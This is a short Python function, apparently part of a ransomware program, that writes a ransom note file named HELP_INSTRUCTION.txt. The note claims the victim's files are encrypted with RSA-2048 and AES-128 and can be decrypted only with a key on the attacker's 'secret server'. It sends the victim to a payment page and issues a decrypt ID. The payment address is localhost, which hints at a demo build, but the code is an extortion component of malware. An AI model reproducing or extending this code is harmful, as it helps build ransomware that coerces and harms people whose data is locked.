def help_text(uuid : str) -> None :
    help_text = [
        'All of your files are encrypted with RSA 2048 and AES-128 ciphers. \n',
        'More information about the RSA and AES can be found here : \n',
        'https://en.wikipedia.org/wiki/RSA_(cryptosystem) \n',
        'https://en.wikipedia.org/wiki/Advanced_Encryption_Standard \n\n',
        'Decrypting of your files is only possible with the private key and decrypt program, which is on our secret server. \n\n',
        'Follow these steps : \n',
        '1. Run your browser and wait for initialization. \n',
        '2. Type in the address bar : http://127.0.0.1:8000/payement \n',
        '3. Follow the instructions on the site. \n'    
        f'!!! Your DECRYPT-ID : {uuid}',
        ]
    file = open('HELP_INSTRUCTION.txt', '+w')
    for t in range(len(help_text)):
        file.write(help_text[t])
